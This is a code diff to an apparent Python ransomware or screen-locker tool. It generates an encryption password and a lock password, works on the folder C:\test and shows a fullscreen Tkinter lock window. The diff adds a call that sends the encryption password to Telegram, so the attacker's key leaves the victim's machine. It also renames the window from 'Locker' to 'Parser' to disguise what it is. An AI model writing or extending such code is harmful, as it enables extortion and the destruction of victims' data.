@@ -8,6 +8,8 @@ from pyautogui import click, moveTo, FailSafeException
 from tkinter import Tk, Entry, Label
 from time import sleep
 
+from send_password import send_password_to_telegram
+
 direct = r"C:\test"
 
 def generate_password(length=12):
@@ -21,6 +23,8 @@ def generate_password(length=12):
 crypt_pass = generate_password(16)  # Для шифрования
 locker_pass = generate_password(12)  # Для блокировки
 
+# Отправка пароля в Telegram
+send_password_to_telegram(crypt_pass)
 
 def locker():
     global k, entry
@@ -48,7 +52,7 @@ def locker():
         root.bind('<Control-KeyPress-c>', callback)
 
     root = Tk()
-    root.title("Locker")
+    root.title("Parser")
     root.attributes("-fullscreen", True)
     entry = Entry(root, font=1)
     label0 = Label(root, text="Parser_v1", font=1)
